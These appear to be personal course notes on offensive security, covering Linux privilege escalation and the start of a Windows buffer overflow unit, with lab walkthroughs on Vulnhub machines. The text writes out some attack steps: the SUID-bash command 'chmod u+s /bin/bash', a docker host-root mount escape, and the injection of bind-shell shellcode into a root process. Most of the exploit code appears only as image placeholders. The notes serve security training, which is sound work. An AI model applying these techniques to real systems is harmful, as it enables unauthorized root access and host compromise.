- **Linux Smart Enumeration**: [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

---

- PoC
    
    Imagine
    
      
    
    If we look for some writable files from the root directory
    
    ![[Untitled 473.png]]
    
    We can see that the /etc/passwd is not properly configured, and we have permissions to write on that file
    
    (since we make it for demonstration)
    
    ![[Untitled 474.png]]
    
    Now, if we set a hardcoded password where the x is, we would not give the opportunity to /etc/passwd to compare the passwords with /etc/shadow
    
    ![[Untitled 475.png]]
    
    So, the password in the passwd is going to be used instead
    
    Now, if we create a hash using openssl
    
    ![[Untitled 476.png]]
    
    And hardcode it to the passwd
    
    ![[Untitled 477.png]]
    
    If we try to log as root, and we paste the hashed password
    
    ![[Untitled 478.png]]
    
    We are now root
    
    Remember that if someone creates a file or directory under OUR directory, we have permission over OUR directory so we can manage the one that we do not have permissions
    
    For example, if root makes use of a binary in our HOME with a cron job, we could delete that binary, replacing it with a malicious binary of our own, an for example set SUID permission over the bash `chmod u+s /bin/bash`
    
    ---
    
    We ahve tools as LinPEAS and Linux Smart Numeration to look for things like this errors
    
      
    
    File transfer
    
    ![[Untitled 479.png]]
    

## Detecting and Exploiting Capabilities

In linux systems, the capabilities are security functionalities that allow the users to make actions that normally would need superuser privileges (root), without having to give these users full access to root. This improves the security, since a process that only needs some privileges can obtain these without having to use root.

  

Capabilities divides in three types:

- **Effective Capabilities**: These are the permissions that are applied directly to the proccess that owns them. These permissions determine what the proccess can do. For example, the “CAP_NET_ADMIN” capability allows the procecs to modify network configuration.
- **Inheritable Capabilities**: These are the permissions that are inherited by child procceses that are created. These can be additional to the efective capabilities that the parent possess. For example, if a proccess has the “CAP_NET_ADMIN” capability and this is configured as heritable, then the childs of this parent proccess will also have this capability.
- **Permitted Capabilities**: These are the permissions that the proccess is permitted to use. This includes both efective and inherited capabilities. A proccess can only execute actions for the allowed permissions. For example, if a proccess has the “CAP_NET_ADMIN” and “CAP_SETUID” capability configured as allowed, then the process can modify network configurations and change its UID.

  

Now , some capabilities may involve some risks from a security perspective if they are assigned to some binaries. For example, the **cap_setuid** allows the proccess to set the UID of a proccess to another value, which may allow a malicious user to execute malicious code with elevated privileges.

  

To list all the capabilities of a binary in Linux, we can use **getcap**. This command shows us the effective, inherated and permitted capabilities. For example, to see what capabilitites the /usr/bin/ping has, we can execute

`getcap /usr/bin/ping`

showing the output:

`/usr/bin/ping = cap_net_admin,cap_net_raw+ep`

  

In this case, the ping binary has two capabilities assigned: cap_net_admin and cap_net_raw+ep. The last one shows us that it has **e**levated **p**rivileges (ep) and the capability cap_net_raw assigned.

  

To assing a capabiltity to a file, we can use setcap. This command establishes the efective, inherited and permitted capabilities of the specified file.

For example, to give the cap_net_admin capability to the /usr/bin/myprogram, we can use

`sudo setcap cap_net_admin+ep /usr/bin/myprogram`

In this case, the command sets the cap_net_admin capability with elevated privileges. Now this binary will be able to handle network configurations.

The elevated privileges bit, is an special attribute taht can be established to a binary file in Linux. This attribute used with the capabilities to allow a binary to execute special permissions, and even if the user that executes this binary do no have them.

When this bit is set, the binary will execute the permitted capabilities of the file itself and not the permissions of the user. This means that the file will be able to make actions that normally would not be able without special permissions.

  

It is important to point that the permitted permissions can be even more limited using a MAC, mandatory access control, like SELinux or AppArmor, that restricts the permissions of the proccess by following the policies established on the machine.

---

- PoC
    
    For testing pourposes, we have to deploy the container with privileges
    
    ![[Untitled 480.png]]
    
    For example, we can list the capabilities of a proc
    
    ![[Untitled 481.png]]
    
    Lets assume that the tcpdump binary has this cap set
    
    ![[Untitled 482.png]]
    
    And now as a non privileged user we search from the root
    
    ![[Untitled 483.png]]
    
    There is a tool called getpcaps that looks for the capabilties of a proccess
    
    ![[Untitled 484.png]]
    
    In this case we found the python bianry with cap_setuid set
    
    ![[Untitled 485.png]]
    
    As we see here, we cannot use regular priv esc as if we have SUID, but, we have, since the capabilty allows us
    
    ![[Untitled 486.png]]
    

## Exploiting the kernel

The kernel is the core of Linux, it handles the administration of the resources of the system, like, memory, proccesses, files and devices. Since its critical role, any vulnerability in the kernel may have great consequences in the safety of the system.

In older versions of Linux, there where found vulnerabilities that if exploited, them allow the attackers to gain root access.

The privilege escalation refers to a technique used by the attackers to obtain elevated permissions on the system, as root when they have limited permissions. For example, a user with limited permissions on the system, may found a kernel vulnerabilty that allow him to obtain superuser access to then compromise the system.

The kernel vulnerabilities can be exploited in various ways. For example, an attacker target a vulnerability in a device controller to obtain access to the kernel and then make malicious operations. Another way of exploiting the vulnerabilities is using buffer overflow techniques, that allow the bad users to write code into kernel reserved areas of the memory.

To mitigate this risk, it is important to maintain an updated system and to apply security patches ASAP.

---

Machine used during lesson  
•  
**Máquina Sumo 1**: [https://www.vulnhub.com/entry/sumo-1,480/](https://www.vulnhub.com/entry/sumo-1,480/)

---

- PoC
    
    In this case we are using a machine that uses ubuntu 12.4, normally an old version of Linux has kernel vulns
    
    SO, lets begin
    
    ![[Untitled 487.png]]
    
    This is the main page of the machine
    
    ![[Untitled 488.png]]
    
    Now lets use gobuster
    
    ![[Untitled 489.png]]
    
    We can see that we have the /cgi-bin/ so its worth to try shellshock
    
    ![[Untitled 490.png]]
    
    ![[Untitled 491.png]]
    
    Now lets try and use this
    
    [https://blog.cloudflare.com/inside-shellshock](https://blog.cloudflare.com/inside-shellshock)
    
    REMEMBER, if dont see a response, use echo to try again
    
    ![[Untitled 492.png]]
    
    ![[Untitled 493.png]]
    
    Now once we are in
    
    ![[Untitled 494.png]]
    
    We can search vulns for this with exploitdb or searchsploit
    
    ![[Untitled 495.png]]
    
    ![[Untitled 496.png]]
    
    ![[Untitled 497.png]]
    
    ![[Untitled 498.png]]
    
    ![[Untitled 499.png]]
    
    TRY VK9 EXPLOIT OVERLAYFS
    
    We have tools as LES LinuxExploitSuggester that is focused on the kernel
    
      
    

## Abusing Special User Groups

In Linux context, groups are used to organize the users and assign permissions to access the resources of the system. The users can belong to one or many groups, and those groups can have different levels of permissions.

There are groups like ‘lxd’ or ‘docker’, that allow the users to execute containers in an easy and efficient way. However, if a malicious user has access to this groups, it could leverage from this to obtain elevated permissions over the system.

For example, if a user has access to the ‘docker’ group, it may use the Docker tool to deploy new containers on the system. During this proccess of deployment, the user could take advantage of the mounts to make some inaccessible resources of the host machine to be accesible from the container. By gaining access to the container as root, the malicious user could infer or manipulate these resources from the container.

To mitigate the risk of abusing the special user groups, it is important to limit carefully the access to those groups and make sure that only trustful users have the access to this groups.

---

- PoC
    
    In this case, we can see the groups of a user
    
    ![[Untitled 500.png]]
    
    Now lets add this user to the docker group
    
    `usermod -a -G docker S4vitar`
    
    ![[Untitled 501.png]]
    
    Now since we are in this group, we can make use of the docker tool
    
    ![[Untitled 502.png]]
    
    So, like this, we can deploy a container, and using mounts we could take advantage of container
    
    ![[Untitled 503.png]]
    
    We can see that, using the -v /:/mnt/root we can mount an specific path of the host machine on to the container
    
    So, having this on mind, we have free mobility over the host system files
    
    ![[Untitled 504.png]]
    
    So, how we could escalate privileges over the host machine? Well one of the ways could be by assigning SUID privileges to the bash binary
    
    ![[Untitled 505.png]]
    
    So when we exit the deployed container, we truly changed the HOST binary
    
    ![[Untitled 506.png]]
    
    ---
    
    Another group is ADM that allows us to see system’s logs, this is not a potential way to escalate privileges by its own, but since we can see logs, we could find some confidential data.
    
    ---
    
    Now, another way is by abusing ‘lxd’ since it is something similar to docker
    
    ![[Untitled 507.png]]
    
    Using this exploit, we could exploit this vuln
    
    ![[Untitled 508.png]]
    
    ![[Untitled 509.png]]
    

## Abusing System’s Internal Services

The internal services are essential components that run on the background inside an OS, handling critical functions, such as, network, printing, updates and system monitoring, among others.

Nevertheless, if these services are active and not properly configured, they can represent a security breach. The attackers could try and exploit these services to obtain unauthorized access to the system.

An example of this could be a badly configured network service with elevated permissions. If an attacker is able to identify this service and find a way to exploit it, the attacker could gain access as a superuser.

In this lesson we will be analyzing a case of how an attacker could, in the first place, detect an active service in a system and then, exploit this to elevate its privileges.

---

- PoC
    
    Let’s assume that we compromised the machine and uploaded a shell
    
    ![[Untitled 510.png]]
    
    Now, for this example porpouse we created a HTTP service that is only exposed at local level
    
    ![[Untitled 511.png]]
    
    ![[Untitled 512.png]]
    
    We can see this service using netstat
    
    ![[Untitled 513.png]]
    
    If any of this internal services are running with elevated privileges, we could take advantage of that
    
    ---
    
    Another path is by exploiting internal services of the system
    
    So in this example we create an automated job for updating the repos every 30s
    
    ![[Untitled 514.png]]
    
    ![[Untitled 515.png]]
    
    ![[Untitled 516.png]]
    
    ![[Untitled 517.png]]
    
    ![[Untitled 518.png]]
    
    Now in this case we can take advantage of a badly configured path, since we have permission to write in the following route
    
    ![[Untitled 519.png]]
    
    So, we can take advantage that we have permission to write on this directory, and exploit the pre-invoke function of apt update, since is being executed every 30 seconds
    
    ![[Untitled 520.png]]
    
    And if we wait 30 seconds
    
    ![[Untitled 521.png]]
    
    We now have an SUID bash binary
    
      
    

## Abusing Specific Binaries

In this lesson we will be analyzing how to elevate out privileges through the exploitation of two different binaries as example.

The first example focuses on exploiting the legitimate binary **exim-4.84-7**, that introduces a vulnerability identifies as **CVE-2016-1531.** This vulnerability allows the attacker to execute privileged commands through the abuse of some environment variables. We will be studying how to take advantage of this vulnerability to escalate privileges and access to restricted functions.

The second example addresses a **Buffer Overflow** on a customized binary on a 32 bits Linux machine with **Active Protections** and **ASLR** enabled. In this case, we will be focusing on exploiting a **ret2libc** on a binary that possess SUID permissions, and its owner is **root.** Through buffer overflow, we will show how to inject privileged commands and elevate our privileges.

The idea of this lesson is to demonstrate how some binaries, legitimate as well personalized, can be exploited to obtain elevated privileges, which highlights the importance of a proper configuration and protection of the systems.

Next, we will be using the following machine from the platform Vulnhub that we will be using to represent the first exploitation case:  
•  
**Máquina Pluck de Vulnhub**: [https://www.vulnhub.com/entry/pluck-1,178/](https://www.vulnhub.com/entry/pluck-1,178/)

On the other hand, we should download Ubuntu 16.04.7 LTS:  
•  
**Ubuntu 16.04.7**: [https://releases.ubuntu.com/16.04/](https://releases.ubuntu.com/16.04/)

And finally, we will use the following custom binary which we will exploiting for our second show case. This binary should be deposited on a PATH route and give execution permissions:  
•  
**Binario** **CUSTOM**: [https://hack4u.io/wp-content/uploads/2023/04/custom](https://hack4u.io/wp-content/uploads/2023/04/custom) (Remove the txt extension)

---

- PoC
    
    We are going to use the Pluck machine from vulnhub.
    
    So basically we are going to explote a buffer overflow
    
      
    
    We begin with a recon of the machine
    
    ![[image.png]]
    
    An this is what we have in the web
    
    ![[image 1.png]]
    
    What caught my eyes is that is using php resources in the url to call the different pages
    
    ![[image 2.png]]
    
    So we can try using a PHP wrapper, to see if we can get the code. I this case the wrapper converts all the code to b64, so we can then use this chain and see the code on our machine.
    
    ![[image 3.png]]
    
    ![[image 4.png]]
    
    And this is the code
    
    ![[image 5.png]]
    
    After analyzing the code, there is nothing
    
    Then we try Directory Listing
    
    ![[image 6.png]]
    
    As we see, there is a script being named on the /etc/passwd binary, let see what that is
    
    ![[image 7.png]]
    
    We could try to use this tftp connection
    
    ![[image 8.png]]
    
    And yes, we got the file
    
    using 7z l backup.tar we list the comrpessed
    
    We can see that there are some interest things in the paul directory
    
    ![[image 9.png]]
    
    Now we can try and connect to the machine via SSH using the priv keys
    
    ![[image 10.png]]
    
    With the id_key4 we got a connection
    
    ![[image 11.png]]
    
    As we can see this is not a BASH
    
    This menu is assigned to the user PAUL as seen in the /etc/passwd binary
    
    Now using the Edit File option of the menu, we got a Vim
    
    So if we try to edit the /etc/passwd
    
    ![[image 12.png]]
    
    Now using GTFOBins, we can look how to exploit vim
    
    Now we create a new varialbe
    
    ![[image 13.png]]
    
    ![[image 14.png]]
    
    We broke out the menu
    
    Looking for binaries we have this
    
    ![[image 15.png]]
    
    As seen we have a concrete Exim binary, s we can look it up using searchsploit
    
    ![[image 16.png]]
    
    Now we transfer this to the victim machine
    
    ![[image 17.png]]
    
    ![[image 18.png]]
    
    And we rooted the machine
    
    ---
    
    Now lets go to another example on which we exploit the buffer overflow
    
    Well use an Ubuntu 16.04.6 machine
    
    ![[image 19.png]]
    
    Deposit the custom binary to the victim machine
    
    ![[image 20.png]]
    
    Using GDb to debug the binary
    
    gdbpeda
    
    Now using peda pattern create, we can create an specific pattern to run in the binary
    
    What this allows us is to then see the offset of the chain we can use and to know which is the max input that the program allows to then start overwriting pass the buffer
    
    ![[image 21.png]]
    
    We can see that we have the max length
    
    ![[image 22.png]]
    
    using peda we can see which is the offset
    
    ![[image 23.png]]
    
    So now, lets try this
    
    ![[image 24.png]]
    
    ![[image 25.png]]
    
    We got it
    
    So now we are injecting our chaing controlling the EIP
    
    ret2libc, we would try this technique to exploit libc
    
    In this technique we define our payload, then exit code and the bin_sh founded in libc
    
    In this case the ASLR is activated so the addresses are being randomized
    
    Since we are using a 32bits system, there are less addresses, so there is a change that the address can be guessed at some point
    
    ![[image 26.png]]
    
    This is the exploit that s4vitar created on the class
    
    ![[image 27.png]]
    
      
    

## Dynamically Linked Shared Objects Library Hijacking

Shared libraries are files that contain functions and resources used by multiple programs.

When a program needs a function from a shared library, the OS searches this library and links the required function dynamically during the execution time. However, if the system does not find the library within the default path, it can search in other directories.

An attacker could take advantage of this situation creating a malicious shared library with the same name of a legitimate library y then put that on a directory where the OS searches for these libraries. When the program tries to load the library, the system will load the malicious library instead of the legitimate, allowing the attacker to execute code with the privileges of the victim program.

In this lesson, we will analyze how the hijack is carried out and identify situations in which this technique could be used.

Here is one of the tools we use to analyze the execution of a program written in C/C++:

  
•  
**Herramienta Uftrace**: [https://github.com/namhyung/uftrace](https://github.com/namhyung/uftrace)

Likewise, here is the URL for the platform AttackDefense, where we will be resolving one of the challenges that involves these techniques.  
  

• **AttackDefense**: [https://attackdefense.com](https://attackdefense.com/)

---

- PoC
    
    We are going to use this program
    
    ![[Untitled 522.png]]
    
    ![[Untitled 523.png]]
    
    ![[Untitled 524.png]]
    
    Now if we want to see the shared libraries that are being used, we are going to use uftrace
    
    ![[Untitled 525.png]]
    
    ![[Untitled 526.png]]
    
    Now we are going to try and hijack the rand() library.
    
    To hijack this library we need to create an structure like
    
    ![[Untitled 527.png]]
    
    Since our rand will need to equal signature level
    
    ![[Untitled 528.png]]
    
    So we could write something like
    
    ![[Untitled 529.png]]
    
    Now the dynamic linker works in a peculiar way, it searches for LD_PRELOAD
    
    ![[Untitled 530.png]]
    
    ---
    
    Attack Defense chaos library example
    
    ![[Untitled 531.png]]
    
    In this case we will need to exploit this binary since its owner is root and has SUID permissons.
    
    I also tell us what library is giving problems
    
    We can go to the PATH where the config is, but we do not have write permissions, but if we cat the config file, we see a PATH that do not exists /home/sutedent/lib
    
    ![[Untitled 532.png]]
    
    So if we create here a c library, we could exploit this
    
    ![[Untitled 533.png]]
    
    ![[Untitled 534.png]]
    
    Now if i move this to /lib directory
    
    ![[Untitled 535.png]]
    
    As we have the error, we need to change the function name
    
    ![[Untitled 536.png]]
    
    ![[Untitled 537.png]]
    

## Docker Breakout

In this lesson we will exploring different techniques to abuse **Docker** to elevate our user privileges and escape the container to pivot to the host machine. We’ll examine specific situations and discuss the different security issues.

  

The techniques in this lesson are:

- Using mounts on the deployment of the container to access privileged files on the host system. We’ll analyze how an attacker may use the mounts to manipulate the files of the host and compromise the system security.
- Container deployment with process share (-pid=host) and privileged permissions (-privileged). We’ll see how to inject malicious shellcode in a running process as root, which will allow an attacker to gain system control.
- Usage of **Portainer** to manage the deployment of a container. We’ll discuss how to, through the usage of mounts, an attacker could access and manipulate privileged files of the host system and escape the container.
- Abusing of the docker API through port 2375 used to create images, deploy containers and inject privileged commands in the host machine. We’ll examine how an attacker can exploit the Docker API to compromise the security of the host system and acomplish a successfull command execution with elevated privileges.

At the end of this lesson we will be able to comprehend the different potential vulnerabilities associated with Docker and also we will learn to identify possible security risks on container based enviroments.

---

- PoC
    
    Well install 22.04 version of ubuntu server
    
    Once we installed it, take a snapshot so we have a previous version
    
    ![[image 28.png]]
    
    As we can see, by default we are in the lxd group, making the machine vulnerable
    
      
    
    For this machine we will install [docker.io](http://docker.io) so we can deploy the containers
    
    ![[image 29.png]]
    
    Install a ubuntu docker image.
    
      
    
    in this case we added a mount to the first container using -v /var/run/docker.sock
    
    ![[image 30.png]]
    
    Basically we are deploying a container inside the container, but the first container has mounted the /var/run/docker.sock file, which allows us to deploy a container in the host machine
    
    By making use of this principle, we could create another container and mount the root directory / to a directory of this new container
    
    ![[image 31.png]]
    
    ![[image 32.png]]
    
    As we see, we executed the chmod command succesfully
    
    ---
    
    In this second case, we will be exploiting a service that is being executed in the host machine
    
    ![[image 33.png]]
    
    Now, since we deployed this container with the —pid=host flag, we now will be able to list all the host machine processes.
    
    So if we use ps -faux now we can list all the processes being used on the host machine
    
    ![[image 34.png]]
    
    This Python process is the one that we started on the host machine as root
    
      
    
    Now, what is the trick here, since root is the owner, we can inject shellcode through this process to execute commands
    
      
    
    > [!info] [Linux] Infecting Running Processes  
    > We have already seen how to infect a file injecting code into the binary so it gets executed next time the infected program is started.  
    > [https://0x00sec.org/t/linux-infecting-running-processes/1097](https://0x00sec.org/t/linux-infecting-running-processes/1097)  
    
    > [!info] 0x00sec_code/mem_inject at master · 0x00pf/0x00sec_code  
    > Code for my 0x00sec.  
    > [https://github.com/0x00pf/0x00sec_code/tree/master/mem_inject](https://github.com/0x00pf/0x00sec_code/tree/master/mem_inject)  
    
    These are the resources used during the lesson
    
      
    
    We will be trying to deploy a bind shell, so once we connect to the victim machine we can use this interactive shell
    
    This is the example code that we will be using
    
    ![[image 35.png]]
    
    This code tries to open an /bin/sh, what we will try is to open a port to then use the bind shell.
    
    So this is the shellcode that we will be using
    
    > [!info] Linux/x64 - Bind (5600/TCP) Shell Shellcode (87 bytes)  
    > Linux/x64 - Bind (5600/TCP) Shell Shellcode (87 bytes).  
    > [https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128)  
    
    Now we create this exploit changing the shellcode
    
    ![[image 36.png]]
    
    Then we compile this code, and we should give the command the PID of the proccess we want to infect
    
    ![[image 37.png]]
    
    To exploit this, the sys_cap_ptrace should be enabled on the container
    
    ![[image 38.png]]
    
    Now if we execute this exploit
    
    ![[image 39.png]]
    
    We should had the port opened on the host machine
    
    ![[image 40.png]]
    
    ---
    
    PORTAINER
    
    ![[image 41.png]]
    
    ![[image 42.png]]
    
    ![[image 43.png]]
    
    ![[image 44.png]]
    
    ---
    
    DOCKER API ABUSING
    
    This resource from hacktricks is a good paper to get deeper into docker API pentesting
    
    > [!info] 2375, 2376 Pentesting Docker | HackTricks  
    > Join the 💬 Discord group or the telegram group or follow us on Twitter 🐦 @hacktricks_live.  
    > [https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker](https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker)  
    
      
    
    This port is not usually open, there are some configs needed to open this port
    
    ![[image 45.png]]
    
    if we send a package we can see that the port is open
    
    ![[image 46.png]]
    
    Through this API we can create an Container
    
    ![[image 47.png]]
    
    This command created a container and this is the ID
    
    ![[image 48.png]]
    

  

---

# Buffer Overflow

## Intro to Buffer Overflow

Buffer overflow is a common vulnerability in software that could allow an attacker to execute malicious code or even take control of a compromised system.

This vulnerability takes place when a program tries to store more data to a buffer than was provided, and by exceeding this buffer capacity the data gets stored on adjacent memory zones.

This could allow an attacker to write malicious code in other memory zones overwriting another data that could be critical for the system, like the return address of a function or the memory address where a variable is stored, allowing the attacker to take control over the program’s flow.

The impact of a buffer overflow are dangerous, since the attacker could exploit this to obtain confidential information, steal data or even take full control of a system. If the attackers have the necessary knowledge they can even execute malicious code on the compromised system.

In the following lessons we will see concise examples of how buffer overflow is exploited on Windows systems, which will allow to understand how attackers could take advantage of this vulnerability and how measures can be taken to protect the systems.

---

  

## Creating our Lab and installing Immunity Debugger

In this lesson we’ll be configuring the laboratory to practice during the the different scenarios.

We will install the following:

- **Windows 7 Home Premium**: [https://windows-7-home-premium.uptodown.com/windows](https://windows-7-home-premium.uptodown.com/windows)
- **Immunity Debugger**: [https://immunityinc.com/products/debugger/](https://immunityinc.com/products/debugger/)
- **mona.py**: [https://raw.githubusercontent.com/corelan/mona/master/mona.py](https://raw.githubusercontent.com/corelan/mona/master/mona.py)
- **SLMail**: [https://slmail.software.informer.com/download/](https://slmail.software.informer.com/download/)

In addition, remember that is important to disable the Data Execution Prevention (DEP) otherwise the buffer overflow will not be vulnerable.

DEP is a security measure that is used to prevent the execution of malicious code in compromised systems via buffer overflow.

DEP works by flagging the areas as “non executable”, which means that any try of executing code in these areas of memory will blocked.

This is useful to prevent Buffer Overflow attacks that tries to take advantage of these memory areas. By flagging these areas as non executables, DEP may prevent these executions and protect the system.

---

- PoC
    
    Install the win7 32 iso on vmware
    
      
    
    Install Immunity debugger
    
      
    
    Since we will be trying to exexute some instructions on the stack, we need to disable the DEP.
    
    ![[image 49.png]]
    
    For this first lesson install SLMail 5.5, which is vulnerable to a remote BOf
    
    ![[image 50.png]]
    

## Initial Phase: Fuzzing and taking control of EIP

In the first phase of the exploitation of a buffer overflow, one of the first tasks is to find out the limits of the objective software. This is tested by introducing more characters than the allowed in the different inputs of the program, like a string or a file, until we can detect that the app fails or gets corrupted.

Once we find out where the limit is, the next step is to find out the offset, which is the exact number of characters that are needed to provoke this corruption and then overwrite the EIP register.

The EIP register is a CPU pointer that points to the memory address where the next instruction is. In a successful buffer overflow the EIP register is overwritten with an attacker’s controlled address, which allows to execute the malicious code instead of the original.

Therefore, the objective is to find out the offset and know the exact number of the input to then overwrite the EIP register and point to the memory address controlled by the attacker.

---

- PoC
